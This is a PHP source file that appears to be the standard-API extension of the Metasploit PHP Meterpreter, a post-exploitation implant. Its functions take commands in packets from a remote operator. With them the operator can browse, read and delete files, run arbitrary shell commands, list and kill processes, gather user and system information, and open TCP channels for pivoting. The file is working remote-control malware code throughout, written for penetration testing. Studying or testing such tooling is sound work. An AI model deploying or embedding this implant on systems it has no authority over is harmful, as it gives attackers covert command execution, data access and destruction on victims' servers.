#<?php
##
# STDAPI
##

# Wrap everything in checks for existence of the new functions in case we get
# eval'd twice
my_print("Evaling stdapi");

if (!function_exists('cononicalize_path')) {
function cononicalize_path($path) {
    $path = str_replace(array("/", "\\"), DIRECTORY_SEPARATOR, $path);
    return $path;
}
}

# Need to nail down what this should actually do.  In ruby, it doesn't expand
# environment variables but in the windows meterpreter it does
if (!function_exists('stdapi_fs_expand_path')) {
function stdapi_fs_expand_path($req, &$pkt) {
    my_print("doing expand_path");
    $path_tlv = packet_get_tlv($req, TLV_TYPE_FILE_PATH);
    return ERROR_FAILURE;
}
}

# works
if (!function_exists('stdapi_fs_chdir')) {
function stdapi_fs_chdir($req, &$pkt) {
    my_print("doing chdir");
    $path_tlv = packet_get_tlv($req, TLV_TYPE_DIRECTORY_PATH);
    chdir(cononicalize_path($path_tlv['value']));
    return ERROR_SUCCESS;
}
}

# works
if (!function_exists('stdapi_fs_delete')) {
function stdapi_fs_delete($req, &$pkt) {
    my_print("doing delete");
    $path_tlv = packet_get_tlv($req, TLV_TYPE_FILE_NAME);
    $ret = unlink(cononicalize_path($path_tlv['value']));
    return $ret ? ERROR_SUCCESS : ERROR_FAILURE;
}
}

# works
if (!function_exists('stdapi_fs_getwd')) {
function stdapi_fs_getwd($req, &$pkt) {
    my_print("doing pwd");
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_DIRECTORY_PATH, getcwd()));
    return ERROR_SUCCESS;
}
}

# works partially, need to get the path argument to mean the same thing as in
# windows
if (!function_exists('stdapi_fs_ls')) {
function stdapi_fs_ls($req, &$pkt) {
    my_print("doing ls");
    $path_tlv = packet_get_tlv($req, TLV_TYPE_DIRECTORY_PATH);
    $path = cononicalize_path($path_tlv['value']);
    $dir_handle = @opendir($path);

    if ($dir_handle) {
        while ($file = readdir($dir_handle)) {
            if ($file != "." && $file != "..") {
                #my_print("Adding file $file");
                packet_add_tlv($pkt, create_tlv(TLV_TYPE_FILE_NAME, $file));
                packet_add_tlv($pkt, create_tlv(TLV_TYPE_FILE_PATH, $path . DIRECTORY_SEPARATOR . $file));
                $st = stat($path . DIRECTORY_SEPARATOR . $file);
                $st_buf = "";
                $st_buf .= pack("V", $st['dev']);
                $st_buf .= pack("v", $st['ino']);
                $st_buf .= pack("v", $st['mode']);
                $st_buf .= pack("v", $st['nlink']);
                $st_buf .= pack("v", $st['uid']);
                $st_buf .= pack("v", $st['gid']);
                $st_buf .= pack("v", 0);
                $st_buf .= pack("V", $st['rdev']);
                $st_buf .= pack("V", $st['size']);
                $st_buf .= pack("V", $st['atime']);
                $st_buf .= pack("V", $st['mtime']);
                $st_buf .= pack("V", $st['ctime']);
                $st_buf .= pack("V", $st['blksize']);
                $st_buf .= pack("V", $st['blocks']);
                packet_add_tlv($pkt, create_tlv(TLV_TYPE_STAT_BUF, $st_buf));
            }
        }
        closedir($dir_handle);
        return ERROR_SUCCESS;
    } else {
        return ERROR_FAILURE;
    }
}
}

if (!function_exists('stdapi_fs_stat')) {
function stdapi_fs_stat($req, &$pkt) {
    my_print("doing stat");
    $path_tlv = packet_get_tlv($req, TLV_TYPE_FILE_PATH);
    $path = cononicalize_path($path_tlv['value']);

    $st = stat($path);
    $st_buf = "";
    $st_buf .= pack("V", $st['dev']);
    $st_buf .= pack("v", $st['ino']);
    $st_buf .= pack("v", $st['mode']);
    $st_buf .= pack("v", $st['nlink']);
    $st_buf .= pack("v", $st['uid']);
    $st_buf .= pack("v", $st['gid']);
    $st_buf .= pack("v", 0);
    $st_buf .= pack("V", $st['rdev']);
    $st_buf .= pack("V", $st['size']);
    $st_buf .= pack("V", $st['atime']);
    $st_buf .= pack("V", $st['mtime']);
    $st_buf .= pack("V", $st['ctime']);
    $st_buf .= pack("V", $st['blksize']);
    $st_buf .= pack("V", $st['blocks']);
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_STAT_BUF, $st_buf));
}
}

# works
if (!function_exists('stdapi_fs_delete_file')) {
function stdapi_fs_delete_file($req, &$pkt) {
    my_print("doing delete");
    $path_tlv = packet_get_tlv($req, TLV_TYPE_FILE_PATH);
    $path = cononicalize_path($path_tlv['value']);

    if ($path && is_file($path)) {
        $worked = @unlink($path);
        return ($worked ? ERROR_SUCCESS : ERROR_FAILURE);
    } else {
        return ERROR_FAILURE;
    }
}
}

# works
if (!function_exists('stdapi_sys_config_getuid')) {
function stdapi_sys_config_getuid($req, &$pkt) {
    my_print("doing getuid");
    if (is_callable('posix_getuid')) {
        $uid = posix_getuid();
        $pwinfo = posix_getpwuid($uid);
        $user = $pwinfo['name'] . " ($uid)";
    } else {
        # The posix functions aren't available, this is probably windows.  Use
        # the functions for getting user name and uid based on file ownership
        # instead.
        $user = get_current_user() . " (" . getmyuid() . ")";
    }
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_USER_NAME, $user));
    return ERROR_SUCCESS;
}
}

# Unimplemented becuase it's unimplementable
if (!function_exists('stdapi_sys_config_rev2self')) {
function stdapi_sys_config_rev2self($req, &$pkt) {
    my_print("doing rev2self");
    return ERROR_FAILURE;
}
}

# works
if (!function_exists('stdapi_sys_config_sysinfo')) {
function stdapi_sys_config_sysinfo($req, &$pkt) {
    my_print("doing sysinfo");
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_COMPUTER_NAME, php_uname("n")));
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_OS_NAME, php_uname()));
    return ERROR_SUCCESS;
}
}

# Global list of processes so we know what to kill when a channel gets closed
$processes = array();

if (!function_exists('stdapi_sys_process_execute')) {
function stdapi_sys_process_execute($req, &$pkt) {
    my_print("doing execute");
    $cmd_tlv = packet_get_tlv($req, TLV_TYPE_PROCESS_PATH);
    $args_tlv = packet_get_tlv($req, TLV_TYPE_PROCESS_ARGUMENTS);
    $flags_tlv = packet_get_tlv($req, TLV_TYPE_PROCESS_FLAGS);

    $cmd = $cmd_tlv['value'];
    $args = $args_tlv['value'];
    $flags = $flags_tlv['value'];

    # If there was no command specified, well, a user sending an empty command
    # deserves failure.
    my_print("Cmd: $cmd $args");
    $real_cmd = $cmd ." ". $args;
    if (0 > strlen($cmd)) {
        return ERROR_FAILURE;
    }
    #my_print("Flags: $flags (" . ($flags & PROCESS_EXECUTE_FLAG_CHANNELIZED) .")");
    if ($flags & PROCESS_EXECUTE_FLAG_CHANNELIZED) {
        global $processes, $channels;
        my_print("Channelized");
        $handle = proc_open($real_cmd, array(array('pipe','r'), array('pipe','w'), array('pipe','w')), $pipes);
        if ($handle === false) {
            return ERROR_FAILURE;
        }
        $pipes['type'] = 'stream';
        register_stream($pipes[0]);
        register_stream($pipes[1]);
        register_stream($pipes[2]);

        $channels[] = $pipes;

        # associate the process with this channel so we know when to close it.
        $processes[count($channels) - 1] = $handle;

        packet_add_tlv($pkt, create_tlv(TLV_TYPE_PID, 0));
        packet_add_tlv($pkt, create_tlv(TLV_TYPE_PROCESS_HANDLE, count($processes)-1));
        packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, count($channels)-1));
    } else {
        # Don't care about stdin/stdout, just run the command
        my_cmd($real_cmd);
    }

    return ERROR_SUCCESS;
}
}

# Works, but not very portable.  There doesn't appear to be a PHP way of
# getting a list of processes, so we just shell out to ps/tasklist.exe.  I need
# to decide what options to send to ps for portability and for information
# usefulness.
if (!function_exists('stdapi_sys_process_get_processes')) {
function stdapi_sys_process_get_processes($req, &$pkt) {
    my_print("doing get_processes");
    $list = array();
    if (is_windows()) {
        # This command produces a line like:
        #  "tasklist.exe","2264","Console","0","4,556 K","Running","EGYPT-B3E55BF3C\Administrator","0:00:00","OleMainThreadWndName"
        $output = my_cmd("tasklist /v /fo csv /nh");
        $lines = explode("\n", trim($output));
        foreach ($lines as $line) {
            $line = trim($line);
            #
            # Ghetto CSV parsing
            #
            $pieces = preg_split('/","/', $line);
            # Strip off the initial quote on the first and last elements
            $pieces[0] = substr($pieces[0], 1, strlen($pieces[0]));
            $cnt = count($pieces) - 1;
            $pieces[$cnt] = substr($pieces[$cnt], 1, strlen($pieces[$cnt]));

            $proc_info = array($pieces[1], $pieces[6], $pieces[0]);
            array_push($list, $proc_info);
        }
    } else {
        # This command produces a line like:
        #    1553 root     /sbin/getty -8 38400 tty1
        $output = my_cmd("ps a -w -o pid,user,cmd --no-header 2>/dev/null");
        $lines = explode("\n", trim($output));
        foreach ($lines as $line) {
            array_push($list, preg_split("/\s+/", trim($line)));
        }
    }
    foreach ($list as $proc) {
        $grp = "";
        $grp .= tlv_pack(create_tlv(TLV_TYPE_PID, $proc[0]));
        $grp .= tlv_pack(create_tlv(TLV_TYPE_USER_NAME, $proc[1]));
        $grp .= tlv_pack(create_tlv(TLV_TYPE_PROCESS_NAME, $proc[2]));
        # Strip the pid and the user name off the front; the rest will be the
        # full command line
        array_shift($proc);
        array_shift($proc);
        $grp .= tlv_pack(create_tlv(TLV_TYPE_PROCESS_PATH, join($proc, " ")));
        packet_add_tlv($pkt, create_tlv(TLV_TYPE_PROCESS_GROUP, $grp));
    }
    return ERROR_SUCCESS;
}
}

# works
if (!function_exists('stdapi_sys_process_getpid')) {
function stdapi_sys_process_getpid($req, &$pkt) {
    my_print("doing getpid");
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_PID, getmypid()));
    return ERROR_SUCCESS;
}
}

if (!function_exists('stdapi_sys_process_kill')) {
function stdapi_sys_process_kill($req, &$pkt) {
    # The existence of posix_kill is unlikely (it's a php compile-time option
    # that isn't enabled by default, but better to try it and avoid shelling
    # out when unnecessary.
    my_print("doing kill");
    $pid_tlv = packet_get_tlv($req, TLV_TYPE_PID);
    $pid = $pid_tlv['value'];
    if (is_callable('posix_kill')) {
        $ret = posix_kill($pid, 9);
        $ret = $ret ? ERROR_SUCCESS : posix_get_last_error();
        if ($ret != ERROR_SUCCESS) {
            my_print(posix_strerror($ret));
        }
    } else {
        $ret = ERROR_FAILURE;
        if (is_windows()) {
            my_cmd("taskkill /f /pid $pid");
            # Don't know how to check for success yet, so just assume it worked
            $ret = ERROR_SUCCESS;
        } else {
            if ("foo" == my_cmd("kill -9 $pid && echo foo")) {
                $ret = ERROR_SUCCESS;
            }
        }
    }
    return $ret;
}
}

if (!function_exists('stdapi_net_socket_tcp_shutdown')) {
function stdapi_net_socket_tcp_shutdown($req, &$pkt) {
    global $channels;
    my_print("doing stdapi_net_socket_tcp_shutdown");
    $cid_tlv = packet_get_tlv(TLV_TYPE_CHANNEL_ID, $req);
    $c = get_channel_by_id($cid_tlv['value']);

    if ($c && $c['type'] == 'socket') {
        @socket_shutdown($c[0], $how);
        $ret = ERROR_SUCCESS;
    } else {
        $ret = ERROR_FAILURE;
    }
    return $ret;
}
}
# END STDAPI



##
# Channel Helper Functions
##

if (!function_exists('channel_create_stdapi_fs_file')) {
function channel_create_stdapi_fs_file($req, &$pkt) {
    global $channels;
    $fpath_tlv = packet_get_tlv($req, TLV_TYPE_FILE_PATH);
    $mode_tlv = packet_get_tlv($req, TLV_TYPE_FILE_MODE);
    #my_print("Opening path {$fpath_tlv['value']} with mode {$mode_tlv['value']}");
    if (!$mode_tlv) {
        $mode_tlv = array('value' => 'rb');
    }
    $fd = @fopen($fpath_tlv['value'], $mode_tlv['value']);

    if (is_resource($fd)) {
        register_stream($fd);
        array_push($channels, array(0 => $fd, 1 => $fd, 'type' => 'stream'));
        $id = count($channels) - 1;
        my_print("Created new file channel $fd, with id $id");
        packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, $id));
        return ERROR_SUCCESS;
    } else {
        my_print("Failed to open");
    }
    return ERROR_FAILURE;
}
}


if (!function_exists('channel_create_stdapi_net_tcp_client')) {
function channel_create_stdapi_net_tcp_client($req, &$pkt) {
    global $channels;
    my_print("creating tcp client");

    $peer_host_tlv = packet_get_tlv($req, TLV_TYPE_PEER_HOST);
    $peer_port_tlv = packet_get_tlv($req, TLV_TYPE_PEER_PORT);
    $local_host_tlv = packet_get_tlv($req, TLV_TYPE_LOCAL_HOST);
    $local_port_tlv = packet_get_tlv($req, TLV_TYPE_LOCAL_PORT);
    $retries_tlv = packet_get_tlv($req, TLV_TYPE_CONNECT_RETRIES);
    if ($retries_tlv['value']) {
        $retries = $retries_tlv['value'];
    } else {
        $retries = 1;
    }

    for ($i = 0; $i < $retries; $i++) {
        $sock = connect($peer_host_tlv['value'], $peer_port_tlv['value']);
        if ($sock) {
            break;
        }
    }

    if (!$sock) {
        return ERROR_FAILURE;
    }

    #
    # If we got here, the connection worked, respond with the new channel ID
    #

    array_push($channels, array(0 => $sock, 1 => $sock, 'type' => get_rtype($sock)));
    $id = count($channels) - 1;
    my_print("Created new channel $sock, with id $id");
    packet_add_tlv($pkt, create_tlv(TLV_TYPE_CHANNEL_ID, $id));
    add_reader($sock);
    return ERROR_SUCCESS;
}
}





